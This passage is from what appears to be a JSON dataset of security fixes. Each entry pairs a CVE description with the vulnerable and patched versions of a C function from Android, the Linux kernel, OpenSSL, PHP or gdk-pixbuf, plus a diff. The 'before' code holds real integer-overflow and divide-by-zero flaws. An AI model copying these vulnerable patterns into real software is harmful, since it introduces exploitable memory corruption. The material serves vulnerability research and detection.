0);\n    if (reserve == MAP_FAILED) {\n        LOGW(\"failed to reserve address space: %s\\n\", strerror(errno));\n        return -1;\n    }\n\n    pMap->ranges[range_count-1].addr = reserve;\n    pMap->ranges[range_count-1].length = blocks * blksize;\n\n    int fd = open(block_dev, O_RDONLY);\n    if (fd < 0) {\n        LOGW(\"failed to open block device %s: %s\\n\", block_dev, strerror(errno));\n        return -1;\n    }\n\n    unsigned char* next = reserve;\n    for (i = 0; i < range_count; ++i) {\n        int start, end;\n        if (fscanf(mapf, \"%d %d\\n\", &start, &end) != 2) {\n            LOGW(\"failed to parse range %d in block map\\n\", i);\n            return -1;\n        }\n\n        void* addr = mmap64(next, (end-start)*blksize, PROT_READ, MAP_PRIVATE | MAP_FIXED, fd, ((off64_t)start)*blksize);\n        if (addr == MAP_FAILED) {\n            LOGW(\"failed to map block %d: %s\\n\", i, strerror(errno));\n            return -1;\n        }\n        pMap->ranges[i].addr = addr;\n        pMap->ranges[i].length = (end-start)*blksize;\n\n        next += pMap->ranges[i].length;\n    }\n\n    pMap->addr = reserve;\n    pMap->length = size;\n\n    LOGI(\"mmapped %d ranges\\n\", range_count);\n\n    return 0;\n}",
        "func": "static int sysMapBlockFile(FILE* mapf, MemMapping* pMap)\n{\n    char block_dev[PATH_MAX+1];\n    size_t size;\n    unsigned int blksize;\n    size_t blocks;\n    unsigned int range_count;\n    unsigned int i;\n\n    if (fgets(block_dev, sizeof(block_dev), mapf) == NULL) {\n        LOGW(\"failed to read block device from header\\n\");\n        return -1;\n    }\n    for (i = 0; i < sizeof(block_dev); ++i) {\n        if (block_dev[i] == '\\n') {\n            block_dev[i] = 0;\n            break;\n        }\n    }\n\n    if (fscanf(mapf, \"%zu %u\\n%u\\n\", &size, &blksize, &range_count) != 3) {\n        LOGW(\"failed to parse block map header\\n\");\n        return -1;\n    }\n    if (blksize != 0) {\n        blocks = ((size-1) / blksize) + 1;\n    }\n    if (size == 0 || blksize == 0 || blocks > SIZE_MAX / blksize || range_count == 0) {\n        LOGE(\"invalid data in block map file: size %zu, blksize %u, range_count %u\\n\",\n             size, blksize, range_count);\n        return -1;\n    }\n\n    pMap->range_count = range_count;\n    pMap->ranges = calloc(range_count, sizeof(MappedRange));\n    if (pMap->ranges == NULL) {\n        LOGE(\"calloc(%u, %zu) failed: %s\\n\", range_count, sizeof(MappedRange), strerror(errno));\n        return -1;\n    }\n\n    // Reserve enough contiguous address space for the whole file.\n    unsigned char* reserve;\n    reserve = mmap64(NULL, blocks * blksize, PROT_NONE, MAP_PRIVATE | MAP_ANON, -1, 0);\n    if (reserve == MAP_FAILED) {\n        LOGW(\"failed to reserve address space: %s\\n\", strerror(errno));\n        free(pMap->ranges);\n        return -1;\n    }\n\n    int fd = open(block_dev, O_RDONLY);\n    if (fd < 0) {\n        LOGW(\"failed to open block device %s: %s\\n\", block_dev, strerror(errno));\n        munmap(reserve, blocks * blksize);\n        free(pMap->ranges);\n        return -1;\n    }\n\n    unsigned char* next = reserve;\n    size_t remaining_size = blocks * blksize;\n    bool success = true;\n    for (i = 0; i < range_count; ++i) {\n        size_t start, end;\n        if (fscanf(mapf, \"%zu %zu\\n\", &start, &end) != 2) {\n            LOGW(\"failed to parse range %d in block map\\n\", i);\n            success = false;\n            break;\n        }\n        size_t length = (end - start) * blksize;\n        if (end <= start || (end - start) > SIZE_MAX / blksize || length > remaining_size) {\n          LOGE(\"unexpected range in block map: %zu %zu\\n\", start, end);\n          success = false;\n          break;\n        }\n\n        void* addr = mmap64(next, length, PROT_READ, MAP_PRIVATE | MAP_FIXED, fd, ((off64_t)start)*blksize);\n        if (addr == MAP_FAILED) {\n            LOGW(\"failed to map block %d: %s\\n\", i, strerror(errno));\n            success = false;\n            break;\n        }\n        pMap->ranges[i].addr = addr;\n        pMap->ranges[i].length = length;\n\n        next += length;\n        remaining_size -= length;\n    }\n    if (success && remaining_size != 0) {\n      LOGE(\"ranges in block map are invalid: remaining_size = %zu\\n\", remaining_size);\n      success = false;\n    }\n    if (!success) {\n      close(fd);\n      munmap(reserve, blocks * blksize);\n      free(pMap->ranges);\n      return -1;\n    }\n\n    close(fd);\n    pMap->addr = reserve;\n    pMap->length = size;\n\n    LOGI(\"mmapped %d ranges\\n\", range_count);\n\n    return 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -3,7 +3,7 @@\n     char block_dev[PATH_MAX+1];\n     size_t size;\n     unsigned int blksize;\n-    unsigned int blocks;\n+    size_t blocks;\n     unsigned int range_count;\n     unsigned int i;\n \n@@ -22,49 +22,80 @@\n         LOGW(\"failed to parse block map header\\n\");\n         return -1;\n     }\n-\n-    blocks = ((size-1) / blksize) + 1;\n+    if (blksize != 0) {\n+        blocks = ((size-1) / blksize) + 1;\n+    }\n+    if (size == 0 || blksize == 0 || blocks > SIZE_MAX / blksize || range_count == 0) {\n+        LOGE(\"invalid data in block map file: size %zu, blksize %u, range_count %u\\n\",\n+             size, blksize, range_count);\n+        return -1;\n+    }\n \n     pMap->range_count = range_count;\n-    pMap->ranges = malloc(range_count * sizeof(MappedRange));\n-    memset(pMap->ranges, 0, range_count * sizeof(MappedRange));\n+    pMap->ranges = calloc(range_count, sizeof(MappedRange));\n+    if (pMap->ranges == NULL) {\n+        LOGE(\"calloc(%u, %zu) failed: %s\\n\", range_count, sizeof(MappedRange), strerror(errno));\n+        return -1;\n+    }\n \n     // Reserve enough contiguous address space for the whole file.\n     unsigned char* reserve;\n     reserve = mmap64(NULL, blocks * blksize, PROT_NONE, MAP_PRIVATE | MAP_ANON, -1, 0);\n     if (reserve == MAP_FAILED) {\n         LOGW(\"failed to reserve address space: %s\\n\", strerror(errno));\n+        free(pMap->ranges);\n         return -1;\n     }\n-\n-    pMap->ranges[range_count-1].addr = reserve;\n-    pMap->ranges[range_count-1].length = blocks * blksize;\n \n     int fd = open(block_dev, O_RDONLY);\n     if (fd < 0) {\n         LOGW(\"failed to open block device %s: %s\\n\", block_dev, strerror(errno));\n+        munmap(reserve, blocks * blksize);\n+        free(pMap->ranges);\n         return -1;\n     }\n \n     unsigned char* next = reserve;\n+    size_t remaining_size = blocks * blksize;\n+    bool success = true;\n     for (i = 0; i < range_count; ++i) {\n-        int start, end;\n-        if (fscanf(mapf, \"%d %d\\n\", &start, &end) != 2) {\n+        size_t start, end;\n+        if (fscanf(mapf, \"%zu %zu\\n\", &start, &end) != 2) {\n             LOGW(\"failed to parse range %d in block map\\n\", i);\n-            return -1;\n+            success = false;\n+            break;\n+        }\n+        size_t length = (end - start) * blksize;\n+        if (end <= start || (end - start) > SIZE_MAX / blksize || length > remaining_size) {\n+          LOGE(\"unexpected range in block map: %zu %zu\\n\", start, end);\n+          success = false;\n+          break;\n         }\n \n-        void* addr = mmap64(next, (end-start)*blksize, PROT_READ, MAP_PRIVATE | MAP_FIXED, fd, ((off64_t)start)*blksize);\n+        void* addr = mmap64(next, length, PROT_READ, MAP_PRIVATE | MAP_FIXED, fd, ((off64_t)start)*blksize);\n         if (addr == MAP_FAILED) {\n             LOGW(\"failed to map block %d: %s\\n\", i, strerror(errno));\n-            return -1;\n+            success = false;\n+            break;\n         }\n         pMap->ranges[i].addr = addr;\n-        pMap->ranges[i].length = (end-start)*blksize;\n+        pMap->ranges[i].length = length;\n \n-        next += pMap->ranges[i].length;\n+        next += length;\n+        remaining_size -= length;\n+    }\n+    if (success && remaining_size != 0) {\n+      LOGE(\"ranges in block map are invalid: remaining_size = %zu\\n\", remaining_size);\n+      success = false;\n+    }\n+    if (!success) {\n+      close(fd);\n+      munmap(reserve, blocks * blksize);\n+      free(pMap->ranges);\n+      return -1;\n     }\n \n+    close(fd);\n     pMap->addr = reserve;\n     pMap->length = size;\n ",
        "diff_line_info": {
            "deleted_lines": [
                "    unsigned int blocks;",
                "",
                "    blocks = ((size-1) / blksize) + 1;",
                "    pMap->ranges = malloc(range_count * sizeof(MappedRange));",
                "    memset(pMap->ranges, 0, range_count * sizeof(MappedRange));",
                "",
                "    pMap->ranges[range_count-1].addr = reserve;",
                "    pMap->ranges[range_count-1].length = blocks * blksize;",
                "        int start, end;",
                "        if (fscanf(mapf, \"%d %d\\n\", &start, &end) != 2) {",
                "            return -1;",
                "        void* addr = mmap64(next, (end-start)*blksize, PROT_READ, MAP_PRIVATE | MAP_FIXED, fd, ((off64_t)start)*blksize);",
                "            return -1;",
                "        pMap->ranges[i].length = (end-start)*blksize;",
                "        next += pMap->ranges[i].length;"
            ],
            "added_lines": [
                "    size_t blocks;",
                "    if (blksize != 0) {",
                "        blocks = ((size-1) / blksize) + 1;",
                "    }",
                "    if (size == 0 || blksize == 0 || blocks > SIZE_MAX / blksize || range_count == 0) {",
                "        LOGE(\"invalid data in block map file: size %zu, blksize %u, range_count %u\\n\",",
                "             size, blksize, range_count);",
                "        return -1;",
                "    }",
                "    pMap->ranges = calloc(range_count, sizeof(MappedRange));",
                "    if (pMap->ranges == NULL) {",
                "        LOGE(\"calloc(%u, %zu) failed: %s\\n\", range_count, sizeof(MappedRange), strerror(errno));",
                "        return -1;",
                "    }",
                "        free(pMap->ranges);",
                "        munmap(reserve, blocks * blksize);",
                "        free(pMap->ranges);",
                "    size_t remaining_size = blocks * blksize;",
                "    bool success = true;",
                "        size_t start, end;",
                "        if (fscanf(mapf, \"%zu %zu\\n\", &start, &end) != 2) {",
                "            success = false;",
                "            break;",
                "        }",
                "        size_t length = (end - start) * blksize;",
                "        if (end <= start || (end - start) > SIZE_MAX / blksize || length > remaining_size) {",
                "          LOGE(\"unexpected range in block map: %zu %zu\\n\", start, end);",
                "          success = false;",
                "          break;",
                "        void* addr = mmap64(next, length, PROT_READ, MAP_PRIVATE | MAP_FIXED, fd, ((off64_t)start)*blksize);",
                "            success = false;",
                "            break;",
                "        pMap->ranges[i].length = length;",
                "        next += length;",
                "        remaining_size -= length;",
                "    }",
                "    if (success && remaining_size != 0) {",
                "      LOGE(\"ranges in block map are invalid: remaining_size = %zu\\n\", remaining_size);",
                "      success = false;",
                "    }",
                "    if (!success) {",
                "      close(fd);",
                "      munmap(reserve, blocks * blksize);",
                "      free(pMap->ranges);",
                "      return -1;",
                "    close(fd);"
            ]
        }
    },
    {
        "cve_id": "CVE-2016-3135",
        "func_name": "torvalds/linux/xt_alloc_table_info",
        "description": "Integer overflow in the xt_alloc_table_info function in net/netfilter/x_tables.c in the Linux kernel through 4.5.2 on 32-bit platforms allows local users to gain privileges or cause a denial of service (heap memory corruption) via an IPT_SO_SET_REPLACE setsockopt call.",
        "git_url": "https://github.com/torvalds/linux/commit/d157bd761585605b7882935ffb86286919f62ea1",
        "commit_title": "netfilter: x_tables: check for size overflow",
        "commit_text": " Ben Hawkes says:  integer overflow in xt_alloc_table_info, which on 32-bit systems can  lead to small structure allocation and a copy_from_user based heap  corruption. ",
        "func_before": "struct xt_table_info *xt_alloc_table_info(unsigned int size)\n{\n\tstruct xt_table_info *info = NULL;\n\tsize_t sz = sizeof(*info) + size;\n\n\t/* Pedantry: prevent them from hitting BUG() in vmalloc.c --RR */\n\tif ((SMP_ALIGN(size) >> PAGE_SHIFT) + 2 > totalram_pages)\n\t\treturn NULL;\n\n\tif (sz <= (PAGE_SIZE << PAGE_ALLOC_COSTLY_ORDER))\n\t\tinfo = kmalloc(sz, GFP_KERNEL | __GFP_NOWARN | __GFP_NORETRY);\n\tif (!info) {\n\t\tinfo = vmalloc(sz);\n\t\tif (!info)\n\t\t\treturn NULL;\n\t}\n\tmemset(info, 0, sizeof(*info));\n\tinfo->size = size;\n\treturn info;\n}",
        "func": "struct xt_table_info *xt_alloc_table_info(unsigned int size)\n{\n\tstruct xt_table_info *info = NULL;\n\tsize_t sz = sizeof(*info) + size;\n\n\tif (sz < sizeof(*info))\n\t\treturn NULL;\n\n\t/* Pedantry: prevent them from hitting BUG() in vmalloc.c --RR */\n\tif ((SMP_ALIGN(size) >> PAGE_SHIFT) + 2 > totalram_pages)\n\t\treturn NULL;\n\n\tif (sz <= (PAGE_SIZE << PAGE_ALLOC_COSTLY_ORDER))\n\t\tinfo = kmalloc(sz, GFP_KERNEL | __GFP_NOWARN | __GFP_NORETRY);\n\tif (!info) {\n\t\tinfo = vmalloc(sz);\n\t\tif (!info)\n\t\t\treturn NULL;\n\t}\n\tmemset(info, 0, sizeof(*info));\n\tinfo->size = size;\n\treturn info;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -2,6 +2,9 @@\n {\n \tstruct xt_table_info *info = NULL;\n \tsize_t sz = sizeof(*info) + size;\n+\n+\tif (sz < sizeof(*info))\n+\t\treturn NULL;\n \n \t/* Pedantry: prevent them from hitting BUG() in vmalloc.c --RR */\n \tif ((SMP_ALIGN(size) >> PAGE_SHIFT) + 2 > totalram_pages)",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "",
                "\tif (sz < sizeof(*info))",
                "\t\treturn NULL;"
            ]
        }
    },
    {
        "cve_id": "CVE-2016-2070",
        "func_name": "torvalds/linux/tcp_cwnd_reduction",
        "description": "The tcp_cwnd_reduction function in net/ipv4/tcp_input.c in the Linux kernel before 4.3.5 allows remote attackers to cause a denial of service (divide-by-zero error and system crash) via crafted TCP traffic.",
        "git_url": "https://github.com/torvalds/linux/commit/8b8a321ff72c785ed5e8b4cf6eda20b35d427390",
        "commit_title": "tcp: fix zero cwnd in tcp_cwnd_reduction",
        "commit_text": " Patch 3759824da87b (\"tcp: PRR uses CRB mode by default and SS mode conditionally\") introduced a bug that cwnd may become 0 when both inflight and sndcnt are 0 (cwnd = inflight + sndcnt). This may lead to a div-by-zero if the connection starts another cwnd reduction phase by setting tp->prior_cwnd to the current cwnd (0) in tcp_init_cwnd_reduction().  To prevent this we skip PRR operation when nothing is acked or sacked. Then cwnd must be positive in all cases as long as ssthresh is positive:  1) The proportional reduction mode    inflight > ssthresh > 0  2) The reduction bound mode   a) inflight == ssthresh > 0    b) inflight < ssthresh      sndcnt > 0 since newly_acked_sacked > 0 and inflight < ssthresh  Therefore in all cases inflight and sndcnt can not both be 0. We check invalid tp->prior_cwnd to avoid potential div0 bugs.  In reality this bug is triggered only with a sequence of less common events.  For example, the connection is terminating an ECN-triggered cwnd reduction with an inflight 0, then it receives reordered/old ACKs or DSACKs from prior transmission (which acks nothing). Or the connection is in fast recovery stage that marks everything lost, but fails to retransmit due to local issues, then receives data packets from other end which acks nothing. ",
        "func_before": "static void tcp_cwnd_reduction(struct sock *sk, const int prior_unsacked,\n\t\t\t       int fast_rexmit, int flag)\n{\n\tstruct tcp_sock *tp = tcp_sk(sk);\n\tint sndcnt = 0;\n\tint delta = tp->snd_ssthresh - tcp_packets_in_flight(tp);\n\tint newly_acked_sacked = prior_unsacked -\n\t\t\t\t (tp->packets_out - tp->sacked_out);\n\n\ttp->prr_delivered += newly_acked_sacked;\n\tif (delta < 0) {\n\t\tu64 dividend = (u64)tp->snd_ssthresh * tp->prr_delivered +\n\t\t\t       tp->prior_cwnd - 1;\n\t\tsndcnt = div_u64(dividend, tp->prior_cwnd) - tp->prr_out;\n\t} else if ((flag & FLAG_RETRANS_DATA_ACKED) &&\n\t\t   !(flag & FLAG_LOST_RETRANS)) {\n\t\tsndcnt = min_t(int, delta,\n\t\t\t       max_t(int, tp->prr_delivered - tp->prr_out,\n\t\t\t\t     newly_acked_sacked) + 1);\n\t} else {\n\t\tsndcnt = min(delta, newly_acked_sacked);\n\t}\n\tsndcnt = max(sndcnt, (fast_rexmit ? 1 : 0));\n\ttp->snd_cwnd = tcp_packets_in_flight(tp) + sndcnt;\n}",
        "func": "static void tcp_cwnd_reduction(struct sock *sk, const int prior_unsacked,\n\t\t\t       int fast_rexmit, int flag)\n{\n\tstruct tcp_sock *tp = tcp_sk(sk);\n\tint sndcnt = 0;\n\tint delta = tp->snd_ssthresh - tcp_packets_in_flight(tp);\n\tint newly_acked_sacked = prior_unsacked -\n\t\t\t\t (tp->packets_out - tp->sacked_out);\n\n\tif (newly_acked_sacked <= 0 || WARN_ON_ONCE(!tp->prior_cwnd))\n\t\treturn;\n\n\ttp->prr_delivered += newly_acked_sacked;\n\tif (delta < 0) {\n\t\tu64 dividend = (u64)tp->snd_ssthresh * tp->prr_delivered +\n\t\t\t       tp->prior_cwnd - 1;\n\t\tsndcnt = div_u64(dividend, tp->prior_cwnd) - tp->prr_out;\n\t} else if ((flag & FLAG_RETRANS_DATA_ACKED) &&\n\t\t   !(flag & FLAG_LOST_RETRANS)) {\n\t\tsndcnt = min_t(int, delta,\n\t\t\t       max_t(int, tp->prr_delivered - tp->prr_out,\n\t\t\t\t     newly_acked_sacked) + 1);\n\t} else {\n\t\tsndcnt = min(delta, newly_acked_sacked);\n\t}\n\tsndcnt = max(sndcnt, (fast_rexmit ? 1 : 0));\n\ttp->snd_cwnd = tcp_packets_in_flight(tp) + sndcnt;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -6,6 +6,9 @@\n \tint delta = tp->snd_ssthresh - tcp_packets_in_flight(tp);\n \tint newly_acked_sacked = prior_unsacked -\n \t\t\t\t (tp->packets_out - tp->sacked_out);\n+\n+\tif (newly_acked_sacked <= 0 || WARN_ON_ONCE(!tp->prior_cwnd))\n+\t\treturn;\n \n \ttp->prr_delivered += newly_acked_sacked;\n \tif (delta < 0) {",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "",
                "\tif (newly_acked_sacked <= 0 || WARN_ON_ONCE(!tp->prior_cwnd))",
                "\t\treturn;"
            ]
        }
    },
    {
        "cve_id": "CVE-2016-2106",
        "func_name": "openssl/EVP_EncryptUpdate",
        "description": "Integer overflow in the EVP_EncryptUpdate function in crypto/evp/evp_enc.c in OpenSSL before 1.0.1t and 1.0.2 before 1.0.2h allows remote attackers to cause a denial of service (heap memory corruption) via a large amount of data.",
        "git_url": "https://git.openssl.org/?p=openssl.git;a=commit;h=3f3582139fbb259a1c3cbb0a25236500a409bf26",
        "commit_title": "",
        "commit_text": "Fix encrypt overflow  An overflow can occur in the EVP_EncryptUpdate function. If an attacker is able to supply very large amounts of input data after a previous call to EVP_EncryptUpdate with a partial block then a length check can overflow resulting in a heap corruption.  Following an analysis of all OpenSSL internal usage of the EVP_EncryptUpdate function all usage is one of two forms.  The first form is like this: EVP_EncryptInit() EVP_EncryptUpdate()  i.e. where the EVP_EncryptUpdate() call is known to be the first called function after an EVP_EncryptInit(), and therefore that specific call must be safe.  The second form is where the length passed to EVP_EncryptUpdate() can be seen from the code to be some small value and therefore there is no possibility of an overflow.  Since all instances are one of these two forms, I believe that there can be no overflows in internal code due to this problem.  It should be noted that EVP_DecryptUpdate() can call EVP_EncryptUpdate() in certain code paths. Also EVP_CipherUpdate() is a synonym for EVP_EncryptUpdate(). Therefore I have checked all instances of these calls too, and came to the same conclusion, i.e. there are no instances in internal usage where an overflow could occur.  This could still represent a security issue for end user code that calls this function directly.  CVE-2016-2106  Issue reported by Guido Vranken.  ",
        "func_before": "int EVP_EncryptUpdate(EVP_CIPHER_CTX *ctx, unsigned char *out, int *outl,\n                      const unsigned char *in, int inl)\n{\n    int i, j, bl;\n\n    if (ctx->cipher->flags & EVP_CIPH_FLAG_CUSTOM_CIPHER) {\n        i = ctx->cipher->do_cipher(ctx, out, in, inl);\n        if (i < 0)\n            return 0;\n        else\n            *outl = i;\n        return 1;\n    }\n\n    if (inl <= 0) {\n        *outl = 0;\n        return inl == 0;\n    }\n\n    if (ctx->buf_len == 0 && (inl & (ctx->block_mask)) == 0) {\n        if (ctx->cipher->do_cipher(ctx, out, in, inl)) {\n            *outl = inl;\n            return 1;\n        } else {\n            *outl = 0;\n            return 0;\n        }\n    }\n    i = ctx->buf_len;\n    bl = ctx->cipher->block_size;\n    OPENSSL_assert(bl <= (int)sizeof(ctx->buf));\n    if (i != 0) {\n        if (i + inl < bl) {\n            memcpy(&(ctx->buf[i]), in, inl);\n            ctx->buf_len += inl;\n            *outl = 0;\n            return 1;\n        } else {\n            j = bl - i;\n            memcpy(&(ctx->buf[i]), in, j);\n            if (!ctx->cipher->do_cipher(ctx, out, ctx->buf, bl))\n                return 0;\n            inl -= j;\n            in += j;\n            out += bl;\n            *outl = bl;\n        }\n    } else\n        *outl = 0;\n    i = inl & (bl - 1);\n    inl -= i;\n    if (inl > 0) {\n        if (!ctx->cipher->do_cipher(ctx, out, in, inl))\n            return 0;\n        *outl += inl;\n    }\n\n    if (i != 0)\n        memcpy(ctx->buf, &(in[inl]), i);\n    ctx->buf_len = i;\n    return 1;\n}",
        "func": "int EVP_EncryptUpdate(EVP_CIPHER_CTX *ctx, unsigned char *out, int *outl,\n                      const unsigned char *in, int inl)\n{\n    int i, j, bl;\n\n    if (ctx->cipher->flags & EVP_CIPH_FLAG_CUSTOM_CIPHER) {\n        i = ctx->cipher->do_cipher(ctx, out, in, inl);\n        if (i < 0)\n            return 0;\n        else\n            *outl = i;\n        return 1;\n    }\n\n    if (inl <= 0) {\n        *outl = 0;\n        return inl == 0;\n    }\n\n    if (ctx->buf_len == 0 && (inl & (ctx->block_mask)) == 0) {\n        if (ctx->cipher->do_cipher(ctx, out, in, inl)) {\n            *outl = inl;\n            return 1;\n        } else {\n            *outl = 0;\n            return 0;\n        }\n    }\n    i = ctx->buf_len;\n    bl = ctx->cipher->block_size;\n    OPENSSL_assert(bl <= (int)sizeof(ctx->buf));\n    if (i != 0) {\n        if (bl - i > inl) {\n            memcpy(&(ctx->buf[i]), in, inl);\n            ctx->buf_len += inl;\n            *outl = 0;\n            return 1;\n        } else {\n            j = bl - i;\n            memcpy(&(ctx->buf[i]), in, j);\n            if (!ctx->cipher->do_cipher(ctx, out, ctx->buf, bl))\n                return 0;\n            inl -= j;\n            in += j;\n            out += bl;\n            *outl = bl;\n        }\n    } else\n        *outl = 0;\n    i = inl & (bl - 1);\n    inl -= i;\n    if (inl > 0) {\n        if (!ctx->cipher->do_cipher(ctx, out, in, inl))\n            return 0;\n        *outl += inl;\n    }\n\n    if (i != 0)\n        memcpy(ctx->buf, &(in[inl]), i);\n    ctx->buf_len = i;\n    return 1;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -30,7 +30,7 @@\n     bl = ctx->cipher->block_size;\n     OPENSSL_assert(bl <= (int)sizeof(ctx->buf));\n     if (i != 0) {\n-        if (i + inl < bl) {\n+        if (bl - i > inl) {\n             memcpy(&(ctx->buf[i]), in, inl);\n             ctx->buf_len += inl;\n             *outl = 0;",
        "diff_line_info": {
            "deleted_lines": [
                "        if (i + inl < bl) {"
            ],
            "added_lines": [
                "        if (bl - i > inl) {"
            ]
        }
    },
    {
        "cve_id": "CVE-2016-4070",
        "func_name": "php/php-src/php_raw_url_encode",
        "description": "Integer overflow in the php_raw_url_encode function in ext/standard/url.c in PHP before 5.5.34, 5.6.x before 5.6.20, and 7.x before 7.0.5 allows remote attackers to cause a denial of service (application crash) via a long string to the rawurlencode function. NOTE: the vendor says \"Not sure if this qualifies as security issue (probably not).",
        "git_url": "https://github.com/php/php-src/commit/95433e8e339dbb6b5d5541473c1661db6ba2c451",
        "commit_title": "Fix bug #71798 - Integer Overflow in php_raw_url_encode",
        "commit_text": "",
        "func_before": "PHPAPI char *php_raw_url_encode(char const *s, int len, int *new_length)\n{\n\tregister int x, y;\n\tunsigned char *str;\n\n\tstr = (unsigned char *) safe_emalloc(3, len, 1);\n\tfor (x = 0, y = 0; len--; x++, y++) {\n\t\tstr[y] = (unsigned char) s[x];\n#ifndef CHARSET_EBCDIC\n\t\tif ((str[y] < '0' && str[y] != '-' && str[y] != '.') ||\n\t\t\t(str[y] < 'A' && str[y] > '9') ||\n\t\t\t(str[y] > 'Z' && str[y] < 'a' && str[y] != '_') ||\n\t\t\t(str[y] > 'z' && str[y] != '~')) {\n\t\t\tstr[y++] = '%';\n\t\t\tstr[y++] = hexchars[(unsigned char) s[x] >> 4];\n\t\t\tstr[y] = hexchars[(unsigned char) s[x] & 15];\n#else /*CHARSET_EBCDIC*/\n\t\tif (!isalnum(str[y]) && strchr(\"_-.~\", str[y]) != NULL) {\n\t\t\tstr[y++] = '%';\n\t\t\tstr[y++] = hexchars[os_toascii[(unsigned char) s[x]] >> 4];\n\t\t\tstr[y] = hexchars[os_toascii[(unsigned char) s[x]] & 15];\n#endif /*CHARSET_EBCDIC*/\n\t\t}\n\t}\n\tstr[y] = '\\0';\n\tif (new_length) {\n\t\t*new_length = y;\n\t}\n\treturn ((char *) str);\n}",
        "func": "PHPAPI char *php_raw_url_encode(char const *s, int len, int *new_length)\n{\n\tregister size_t x, y;\n\tunsigned char *str;\n\n\tstr = (unsigned char *) safe_emalloc(3, len, 1);\n\tfor (x = 0, y = 0; len--; x++, y++) {\n\t\tstr[y] = (unsigned char) s[x];\n#ifndef CHARSET_EBCDIC\n\t\tif ((str[y] < '0' && str[y] != '-' && str[y] != '.') ||\n\t\t\t(str[y] < 'A' && str[y] > '9') ||\n\t\t\t(str[y] > 'Z' && str[y] < 'a' && str[y] != '_') ||\n\t\t\t(str[y] > 'z' && str[y] != '~')) {\n\t\t\tstr[y++] = '%';\n\t\t\tstr[y++] = hexchars[(unsigned char) s[x] >> 4];\n\t\t\tstr[y] = hexchars[(unsigned char) s[x] & 15];\n#else /*CHARSET_EBCDIC*/\n\t\tif (!isalnum(str[y]) && strchr(\"_-.~\", str[y]) != NULL) {\n\t\t\tstr[y++] = '%';\n\t\t\tstr[y++] = hexchars[os_toascii[(unsigned char) s[x]] >> 4];\n\t\t\tstr[y] = hexchars[os_toascii[(unsigned char) s[x]] & 15];\n#endif /*CHARSET_EBCDIC*/\n\t\t}\n\t}\n\tstr[y] = '\\0';\n\tif (new_length) {\n\t\t*new_length = y;\n\t}\n\treturn ((char *) str);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -1,6 +1,6 @@\n PHPAPI char *php_raw_url_encode(char const *s, int len, int *new_length)\n {\n-\tregister int x, y;\n+\tregister size_t x, y;\n \tunsigned char *str;\n \n \tstr = (unsigned char *) safe_emalloc(3, len, 1);",
        "diff_line_info": {
            "deleted_lines": [
                "\tregister int x, y;"
            ],
            "added_lines": [
                "\tregister size_t x, y;"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-8875",
        "func_name": "GNOME/gdk-pixbuf/pixops_composite_color_nearest",
        "description": "Multiple integer overflows in the (1) pixops_composite_nearest, (2) pixops_composite_color_nearest, and (3) pixops_process functions in pixops/pixops.c in gdk-pixbuf before 2.33.1 allow remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted image, which triggers a heap-based buffer overflow.",
        "git_url": "https://github.com/GNOME/gdk-pixbuf/commit/dbfe8f70471864818bf458a39c8a99640895bd22",
        "commit_title": "pixops: use gint64 in more places to avoid overflow when shifting",
        "commit_text": "",
        "func_before": "static void\npixops_composite_color_nearest (guchar        *dest_buf,\n\t\t\t\tint            render_x0,\n\t\t\t\tint            render_y0,\n\t\t\t\tint            render_x1,\n\t\t\t\tint            render_y1,\n\t\t\t\tint            dest_rowstride,\n\t\t\t\tint            dest_channels,\n\t\t\t\tgboolean       dest_has_alpha,\n\t\t\t\tconst guchar  *src_buf,\n\t\t\t\tint            src_width,\n\t\t\t\tint            src_height,\n\t\t\t\tint            src_rowstride,\n\t\t\t\tint            src_channels,\n\t\t\t\tgboolean       src_has_alpha,\n\t\t\t\tdouble         scale_x,\n\t\t\t\tdouble         scale_y,\n\t\t\t\tint            overall_alpha,\n\t\t\t\tint            check_x,\n\t\t\t\tint            check_y,\n\t\t\t\tint            check_size,\n\t\t\t\tguint32        color1,\n\t\t\t\tguint32        color2)\n{\n  int i, j;\n  int x;\n  int x_step = (1 << SCALE_SHIFT) / scale_x;\n  int y_step = (1 << SCALE_SHIFT) / scale_y;\n  int r1, g1, b1, r2, g2, b2;\n  int check_shift = get_check_shift (check_size);\n  int xmax, xstart, xstop, x_pos, y_pos;\n  const guchar *p;\n  unsigned int  a0;\n\n  for (i = 0; i < (render_y1 - render_y0); i++)\n    {\n      const guchar *src;\n      guchar       *dest;\n      y_pos = ((i + render_y0) * y_step + y_step / 2) >> SCALE_SHIFT;\n      y_pos = CLAMP (y_pos, 0, src_height - 1);\n      src  = src_buf + (gsize)y_pos * src_rowstride;\n      dest = dest_buf + (gsize)i * dest_rowstride;\n\n      x = render_x0 * x_step + x_step / 2;\n      \n      \n      if (((i + check_y) >> check_shift) & 1)\n\t{\n\t  r1 = (color2 & 0xff0000) >> 16;\n\t  g1 = (color2 & 0xff00) >> 8;\n\t  b1 = color2 & 0xff;\n\n\t  r2 = (color1 & 0xff0000) >> 16;\n\t  g2 = (color1 & 0xff00) >> 8;\n\t  b2 = color1 & 0xff;\n\t}\n      else\n\t{\n\t  r1 = (color1 & 0xff0000) >> 16;\n\t  g1 = (color1 & 0xff00) >> 8;\n\t  b1 = color1 & 0xff;\n\n\t  r2 = (color2 & 0xff0000) >> 16;\n\t  g2 = (color2 & 0xff00) >> 8;\n\t  b2 = color2 & 0xff;\n\t}\n\n      j = 0;\n      INNER_LOOP(src_channels, dest_channels,\n\t  if (src_has_alpha)\n\t    a0 = (p[3] * overall_alpha + 0xff) >> 8;\n\t  else\n\t    a0 = overall_alpha;\n\n          switch (a0)\n            {\n            case 0:\n              if (((j + check_x) >> check_shift) & 1)\n                {\n                  dest[0] = r2; \n                  dest[1] = g2; \n                  dest[2] = b2;\n                }\n              else\n                {\n                  dest[0] = r1; \n                  dest[1] = g1; \n                  dest[2] = b1;\n                }\n            break;\n            case 255:\n\t      dest[0] = p[0];\n\t      dest[1] = p[1];\n\t      dest[2] = p[2];\n              break;\n            default:\n\t\t     {\n\t\t       unsigned int tmp;\n              if (((j + check_x) >> check_shift) & 1)\n                {\n                  tmp = ((int) p[0] - r2) * a0;\n                  dest[0] = r2 + ((tmp + 